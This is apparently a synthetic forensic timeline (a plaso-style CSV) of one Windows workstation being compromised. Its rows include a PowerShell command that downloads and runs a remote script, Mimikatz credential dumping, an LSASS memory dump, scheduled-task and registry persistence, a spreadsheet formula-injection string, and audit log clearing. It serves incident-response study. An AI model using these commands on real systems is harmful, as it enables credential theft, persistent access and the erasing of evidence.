date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
03/14/2026,08:00:03,UTC,M...,FILE,NTFS $MFT,Content Modification Time,-,WKSTN01,hosts modified,File modified: C:/Windows/System32/drivers/etc/hosts,2,TSK:/Windows/System32/drivers/etc/hosts,9114,-,filestat,-
03/14/2026,08:00:44,UTC,.A..,LOG,WinPrefetch,Last Access Time,-,WKSTN01,SVCHOST.EXE prefetch,"Prefetch [SVCHOST.EXE] was executed, run count 214",2,OS:/Windows/Prefetch/SVCHOST.EXE-1B4A9C31.pf,20114,-,prefetch,-
03/14/2026,08:01:10,UTC,MACB,REG,Registry Key,Creation Time,-,WKSTN01,WinDefend service key,[HKLM\System\CurrentControlSet\Services\WinDefend] Start: 2,2,TSK:/Windows/System32/config/SYSTEM,3311,-,winreg_default,-
03/14/2026,08:02:31,UTC,MACB,EVT,WinEVTX,Recorded Time,WKSTN01$,WKSTN01,4624 logon,"[4624] An account was successfully logged on. Account Name: WKSTN01$, Logon Type: 5",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4412,-,winevtx,-
03/14/2026,08:05:02,UTC,MACB,WEBHIST,Chrome History,Last Visited Time,jdoe,WKSTN01,update.example.com visit,https://update.example.com/patch/index.html (Example Update Service) [count: 3],2,OS:/Users/jdoe/AppData/Local/Google/Chrome/User Data/Default/History,7781,-,chrome_27_history,-
03/14/2026,08:09:17,UTC,M...,FILE,NTFS $MFT,Content Modification Time,-,WKSTN01,install.esd modified,File modified: C:/Windows/SoftwareDistribution/Download/install.esd,2,TSK:/Windows/SoftwareDistribution/Download/install.esd,6620,-,filestat,-
03/14/2026,08:12:00,UTC,MACB,EVT,WinEVTX,Recorded Time,SYSTEM,WKSTN01,Defender scan clean,[1000] Windows Defender scan completed with no threats found.,2,TSK:/Windows/System32/winevt/Logs/Application.evtx,4413,-,winevtx,-
03/14/2026,08:20:41,UTC,.A..,LOG,WinPrefetch,Last Access Time,-,WKSTN01,NOTEPAD.EXE prefetch,"Prefetch [NOTEPAD.EXE] was executed, run count 12",2,OS:/Windows/Prefetch/NOTEPAD.EXE-D8414F97.pf,20115,-,prefetch,-
03/14/2026,08:31:55,UTC,...B,FILE,NTFS $MFT,Creation Time,jdoe,WKSTN01,docx created,File created: C:/Users/jdoe/Documents/quarterly-notes.docx,2,TSK:/Users/jdoe/Documents/quarterly-notes.docx,8801,-,filestat,-
03/14/2026,08:44:09,UTC,MACB,REG,UserAssist,Recorded Time,jdoe,WKSTN01,UserAssist explorer,"[HKCU\...\Explorer\UserAssist] Value: Microsoft.Windows.Explorer, count 88",2,TSK:/Users/jdoe/NTUSER.DAT,3312,-,userassist,-
03/14/2026,09:02:13,UTC,.A..,LOG,WinPrefetch,Last Access Time,-,WKSTN01,POWERSHELL.EXE prefetch,"Prefetch [POWERSHELL.EXE] was executed, run count 1",2,OS:/Windows/Prefetch/POWERSHELL.EXE-59FC8F3D.pf,20116,-,prefetch,-
03/14/2026,09:02:58,UTC,...B,FILE,NTFS $MFT,Creation Time,SYSTEM,WKSTN01,ps1 dropped in Temp,File created: C:/Windows/Temp/update_check.ps1,2,TSK:/Windows/Temp/update_check.ps1,9902,-,filestat,-
03/14/2026,09:03:12,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,4104 scriptblock,"[4104] Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.44/a.ps1')",2,TSK:/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,4501,-,winevtx,-
03/14/2026,09:04:30,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,4688 ps1 launch,"[4688] A new process has been created. New Process Name: C:/Windows/Temp/update_check.ps1, Creator Process Name: powershell.exe",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4414,-,winevtx,-
03/14/2026,09:07:45,UTC,...B,FILE,NTFS $MFT,Creation Time,jdoe,WKSTN01,mimikatz.exe created,File created: C:/Users/Public/Downloads/mimikatz.exe,2,TSK:/Users/Public/Downloads/mimikatz.exe,9903,-,filestat,-
03/14/2026,09:08:02,UTC,.A..,LOG,WinPrefetch,Last Access Time,-,WKSTN01,MIMIKATZ.EXE prefetch,"Prefetch [MIMIKATZ.EXE] was executed, run count 1",2,OS:/Windows/Prefetch/MIMIKATZ.EXE-2A7E0011.pf,20117,-,prefetch,-
03/14/2026,09:08:19,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,mimikatz executed,"[4688] A new process has been created. Command Line: mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4415,-,winevtx,-
03/14/2026,09:11:04,UTC,MACB,EVT,WinEVTX,Recorded Time,SYSTEM,WKSTN01,4698 task created,"[4698] A scheduled task was created. Task Name: \Microsoft\Windows\WindowsUpdate\SysHealthCheck, Command: C:/Windows/Temp/update_check.ps1",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4416,-,winevtx,-
03/14/2026,09:11:06,UTC,...B,FILE,NTFS $MFT,Creation Time,SYSTEM,WKSTN01,task xml created,File created: C:/Windows/System32/Tasks/Microsoft/Windows/WindowsUpdate/SysHealthCheck,2,TSK:/Windows/System32/Tasks/Microsoft/Windows/WindowsUpdate/SysHealthCheck,9904,-,filestat,-
03/14/2026,09:12:40,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,schtasks create,"[4688] A new process has been created. Command Line: schtasks.exe /create /tn ""SysHealthCheck"" /tr ""powershell -ep bypass -f C:\Windows\Temp\update_check.ps1"" /sc minute /mo 30 /ru SYSTEM",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4417,-,winevtx,-
03/14/2026,09:15:22,UTC,MACB,REG,Registry Key,Creation Time,jdoe,WKSTN01,Run key persistence,"[HKCU\Software\Microsoft\Windows\CurrentVersion\Run] Value name: ""OneDriveSync"" data: C:/Users/jdoe/AppData/Roaming/onedrivesync.exe",2,TSK:/Users/jdoe/NTUSER.DAT,3313,-,winreg_default,-
03/14/2026,09:18:03,UTC,MACB,WEBHIST,Chrome History,Last Visited Time,jdoe,WKSTN01,gate.php beacon,http://198.51.100.77:8443/gate.php (no title) [count: 41],2,OS:/Users/jdoe/AppData/Local/Google/Chrome/User Data/Default/History,7782,-,chrome_27_history,-
03/14/2026,09:20:59,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,comsvcs MiniDump,"[4688] A new process has been created. Command Line: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Windows\Temp\lsass.dmp full",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4418,-,winevtx,-
03/14/2026,09:21:31,UTC,...B,FILE,NTFS $MFT,Creation Time,jdoe,WKSTN01,lsass.dmp created,File created: C:/Windows/Temp/lsass.dmp,2,TSK:/Windows/Temp/lsass.dmp,9905,-,filestat,-
03/14/2026,09:26:14,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,4720 account created,"[4720] A user account was created. New Account: svc_backup, Caller: jdoe",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4419,-,winevtx,-
03/14/2026,09:26:20,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,4732 admin group add,"[4732] A member was added to a security-enabled local group. Group: Administrators, Member: svc_backup",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4420,-,winevtx,-
03/14/2026,09:33:47,UTC,MACB,EVT,WinEVTX,Recorded Time,svc_backup,WKSTN01,wevtutil cl Security,[4688] A new process has been created. Command Line: wevtutil.exe cl Security,2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4421,-,winevtx,-
03/14/2026,09:33:49,UTC,MACB,EVT,WinEVTX,Recorded Time,svc_backup,WKSTN01,1102 audit log cleared,[1102] The audit log was cleared. Subject User Name: svc_backup,2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4422,-,winevtx,-
03/14/2026,09:34:05,UTC,MACB,EVT,WinEVTX,Recorded Time,svc_backup,WKSTN01,104 system log cleared,[104] The System log file was cleared. User: svc_backup,2,TSK:/Windows/System32/winevt/Logs/System.evtx,4423,-,winevtx,-
03/14/2026,09:40:11,UTC,M...,FILE,NTFS $MFT,Content Modification Time,jdoe,WKSTN01,export.csv modified,"=cmd|' /C calc.exe'!A0 was written into C:/Users/jdoe/Documents/export.csv",2,TSK:/Users/jdoe/Documents/export.csv,8802,-,filestat,-
03/14/2026,09:41:00,UTC,MACB,REG,Registry Key,Creation Time,SYSTEM,WKSTN01,IFEO sethc debugger,"Registry value ""Debugger"" set on Image File Execution Options for sethc.exe",2,TSK:/Windows/System32/config/SOFTWARE,3314,-,winreg_default,-
03/14/2026,09:44:26,UTC,MACB,EVT,WinEVTX,Recorded Time,SYSTEM,WKSTN01,7045 PSEXESVC installed,"[7045] A service was installed in the system. Service Name: PSEXESVC, Service File Name: C:\Windows\PSEXESVC.exe",2,TSK:/Windows/System32/winevt/Logs/System.evtx,4424,-,winevtx,-
03/14/2026,09:50:08,UTC,.A..,LOG,WinPrefetch,Last Access Time,-,WKSTN01,PSEXESVC.EXE prefetch,"Prefetch [PSEXESVC.EXE] was executed, run count 1",2,OS:/Windows/Prefetch/PSEXESVC.EXE-3C9A0BD2.pf,20118,-,prefetch,-
03/14/2026,10:02:17,UTC,M...,FILE,NTFS $MFT,Content Modification Time,jdoe,WKSTN01,index.dat modified,File modified: C:/Users/jdoe/AppData/Local/Microsoft/Windows/INetCache/IE/index.dat,2,TSK:/Users/jdoe/AppData/Local/Microsoft/Windows/INetCache/IE/index.dat,7783,-,filestat,-
03/14/2026,10:05:51,UTC,MACB,REG,BAM,Recorded Time,jdoe,WKSTN01,BAM cmd.exe,[HKLM\System\CurrentControlSet\Services\bam\State\UserSettings] \Device\HarddiskVolume2\Windows\System32\cmd.exe,2,TSK:/Windows/System32/config/SYSTEM,3315,-,winreg_bam,-
03/14/2026,10:14:09,UTC,...B,LNK,Windows Shortcut,Creation Time,jdoe,WKSTN01,Budget.lnk created,[Empty description] Local path: C:/Users/jdoe/Desktop/Budget.xlsx,2,OS:/Users/jdoe/AppData/Roaming/Microsoft/Windows/Recent/Budget.lnk,8803,-,lnk,-
03/14/2026,10:22:35,UTC,MACB,EVT,WinEVTX,Recorded Time,SYSTEM,WKSTN01,7036 spooler running,[7036] The Print Spooler service entered the running state.,2,TSK:/Windows/System32/winevt/Logs/System.evtx,4425,-,winevtx,-
03/14/2026,10:31:44,UTC,M...,FILE,NTFS $MFT,Content Modification Time,-,-,mpenginedb modified,File modified: C:/ProgramData/Microsoft/Windows Defender/Scans/mpenginedb.db,2,TSK:/ProgramData/Microsoft/Windows Defender/Scans/mpenginedb.db,6621,-,filestat,-
03/14/2026,10:48:02,UTC,MACB,EVT,WinEVTX,Recorded Time,jdoe,WKSTN01,4634 logoff,"[4634] An account was logged off. Account Name: jdoe, Logon Type: 2",2,TSK:/Windows/System32/winevt/Logs/Security.evtx,4426,-,winevtx,-
03/14/2026,11:00:00,UTC,MACB,LOG,Windows Firewall Log,Recorded Time,-,WKSTN01,firewall allow 8443,ALLOW TCP 192.0.2.44 198.51.100.77 49871 8443 - SEND,2,OS:/Windows/System32/LogFiles/Firewall/pfirewall.log,0,-,winfirewall,-
